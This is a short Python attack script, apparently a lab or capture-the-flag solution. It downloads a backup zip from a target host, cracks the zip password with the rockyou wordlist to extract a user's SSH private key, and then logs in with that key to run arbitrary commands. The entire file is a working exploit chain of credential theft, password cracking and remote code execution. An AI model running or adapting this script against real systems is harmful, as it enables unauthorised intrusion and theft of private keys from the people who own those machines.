import requests
import io
import paramiko

def connect(ip, command):
    import zipfile
    url = 'http://'+ip+'/backups/home.zip'
    r = requests.get(url)
    zipfile = zipfile.ZipFile(io.BytesIO(r.content))
    print(zipfile.namelist())
    with open('/usr/share/wordlists/rockyou.txt','rb') as wordlist:
        for word in wordlist:
            try:
                id_rsa = zipfile.read('home/user/.ssh/id_rsa', pwd=word.strip())
            except:
                continue
            else:
                print('password is '+word.decode().strip())

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)
    key = paramiko.RSAKey.from_private_key(io.StringIO(id_rsa.decode()))
    ssh.connect(ip, username='user', pkey=key)
    _stdin, stdout, _stderr = ssh.exec_command(command)
    print(stdout.read().decode())

if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = ArgumentParser()
    parser.add_argument("host")
    parser.add_argument("--command", type=str, default='id')
    args = parser.parse_args()
    connect(args.host, args.command)